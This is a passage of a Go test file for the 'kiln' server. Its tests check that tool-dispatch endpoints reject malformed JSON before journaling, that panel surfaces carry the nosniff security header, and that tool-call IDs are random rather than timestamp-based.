		t.Errorf("/kiln/tool/add_entity accepted case-folded-key body (encoding/json resolves it last-wins and the tool runs on the second value): status %d, body %.200s — want 400", rec.Code, rec.Body.String())
	}
}

// TestToolDispatchRejectsMalformed is a different mechanism from the
// duplicate-key family: a body that fails to parse must not mint a
// tool_call envelope into the journal either — the envelope is written
// only after the body proves parseable.
func TestToolDispatchRejectsMalformed(t *testing.T) {
	l, _ := newCSRFTestServer(t)
	before := countToolCalls(t, l)
	rec := localJSONPost(t, l, "/kiln/tool/add_entity", `{"entity":{"name":`)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("/kiln/tool/add_entity accepted malformed JSON: status %d, body %.200s — want 400", rec.Code, rec.Body.String())
	}
	if after := countToolCalls(t, l); after != before {
		t.Errorf("malformed JSON body minted %d tool_call journal envelope(s) before parse validation; the envelope must only be journaled after the body proves parseable", after-before)
	}
}

func countToolCalls(t *testing.T, l *live.Live) int {
	t.Helper()
	entries, err := l.Journal().Read()
	if err != nil {
		t.Fatal(err)
	}
	n := 0
	for _, e := range entries {
		if e.Kind == journal.KindToolCall {
			n++
		}
	}
	return n
}

// Property: every browser-facing response the kiln server produces
// carries X-Content-Type-Options: nosniff (the framework default
// chain's discipline). The panel surfaces render live session/world
// state into the operator's page, so the aux router they ride is
// wrapped in the same security-header middleware.
func TestPanelSurfacesCarryNoSniff(t *testing.T) {
	l, _ := newCSRFTestServer(t)

	for _, path := range []string{
		"/core-ui/widget/kiln-panel/chrome", // HTML fragment from live session state
		"/core-ui/widget/kiln-panel/state",  // JSON the panel re-renders from
		"/core-ui/widget/kiln-panel/style.css",
	} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		req.Header.Set("Accept", "text/html,*/*")
		rec := httptest.NewRecorder()
		l.ServeHTTP(rec, req)
		res := rec.Result()
		if res.StatusCode != http.StatusOK {
			t.Fatalf("%s: status %d — surface moved, revisit this pin", path, res.StatusCode)
		}
		if ct := res.Header.Get("Content-Type"); ct == "" {
			t.Fatalf("%s: no Content-Type at all — wrong surface", path)
		}
		if got := res.Header.Get("X-Content-Type-Options"); got != "nosniff" {
			t.Errorf("%s (Content-Type %q) served without X-Content-Type-Options (got %q): the aux router must carry the default chain's security headers", path, res.Header.Get("Content-Type"), got)
		}
	}
}

// nanoRun matches any run of digits long enough to be a nanosecond
// timestamp embedded in an id.
var nanoRun = regexp.MustCompile(`[0-9]{15,}`)

// Property: tool-call envelope ids (CallID and the journal entry id)
// are minted from crypto/rand, never from a wall-clock timestamp or
// counter — they pair calls with results in panel state and would be
// enumerable otherwise.
func TestToolCallIDsUnpredictable(t *testing.T) {
	l, tools := newCSRFTestServer(t)
	srv := New(l, tools)
	if run := nanoRun.FindString(srv.nextCallID()); run != "" {
		t.Errorf("nextCallID minted a timestamp-shaped id (numeric run %q)", run)
	}
	before := countToolCalls(t, l)
	if rec := localJSONPost(t, l, "/kiln/tool/add_entity", `{"entity":{"name":"ids","fields":[]}}`); rec.Code != http.StatusOK {
		t.Fatalf("add_entity: %d %s", rec.Code, rec.Body.String())
	}
	entries, err := l.Journal().Read()
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries[before:] {
		if run := nanoRun.FindString(e.ID); run != "" {
			t.Errorf("journal entry id %q embeds a %d-digit numeric run — mint envelope ids from crypto/rand, not the clock", e.ID, len(run))
		}
		var p journal.ToolCallPayload
		if e.Kind == journal.KindToolCall && e.Decode(&p) == nil {
			if run := nanoRun.FindString(p.CallID); run != "" {
				t.Errorf("tool_call CallID %q embeds a nanosecond-scale numeric run — mint call ids from crypto/rand, not the clock", p.CallID)
			}
		}
	}
}
